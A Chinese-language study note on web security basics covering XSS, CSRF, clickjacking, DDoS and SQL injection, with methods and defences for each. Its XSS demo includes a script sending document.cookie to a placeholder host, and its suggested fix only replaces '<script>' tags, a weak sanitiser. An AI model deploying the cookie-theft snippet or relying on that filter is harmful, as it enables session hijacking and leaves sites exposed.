XSS：
      Cross Site Script跨站脚本攻击。
      手段：黑客将JS代码插入到网页内容中，渲染时执行JS代码。
      预防：特殊字符替换（前段或者后端）。

  ```html
  <body>
    <p>XSS Demo</p>
    <div>
      <p>123123</p>
      <script>
        // image可以规避跨域。
        var image = document.createElement('image');
        image.src = 'http://xxx.com/api/xxx?cookie=' + document.cookie;
      </script>
    </div>

    <script>
      const str = `
            <p>123123</p>
            <script>
              var image = document.createElement('image');
              image.src = 'http://xxx.com/api/xxx?cookie=' + document.cookie;
            </script>
     `;

     const newStr = str.replace(/<script>/g, '&lt;script&gt;');

     // Vue可以自动规避XSS，除非使用v-html；
     // React可以自动规避XSS，除非使用dangerouslySetInnerHTML；
    </script>
  </body>
  ```

CSRF：
    Cross Site Request Forgery，跨站请求伪造。
    手段：黑客诱导用户去访问另一个网站的接口，伪造请求。
    预防：严格的跨域限制 + 验证码机制。

    详细过程：
        用户登录了A网站，有了cookie。
        黑客诱导用户到B网站，并发起A网站的请求。
        A网站的API发现有cookie，认为是用户自己操作的。
    
    预防手段：
        严格的跨域请求限制，如判断referrer（请求来源）。
        为cookie设置SameSite，禁止跨域传递cookie。
        关键接口使用短信验证码。

点击劫持：Click Jacking
    手段：诱导界面上蒙一个透明的iframe，诱导用户点击。
    预防：让iframe不能跨域加载。

```js
if(top.location.hostname !== self.location.hostname){
  alert("您正在访问不安全的页面，即将跳转到安全页面！")
  top.location.href = self.location.href;
}
```
Response headers:
X-Frame-Options:sameorigin

DDoS：
    Distribute denial-of-service 分布式拒绝服务。
    手段：分布式的、大规模的流量访问，使服务器瘫痪。
    预防：软件层不好做，需硬件预防（如阿里云WAF）。

SQL注入：
    手段：黑客提交内容时写入SQL语句，破坏数据库。
    预防：处理输入的内容，替换特殊字符。

划重点：
    预防攻击，要各司其职，而不要依赖其他角色（如后端）。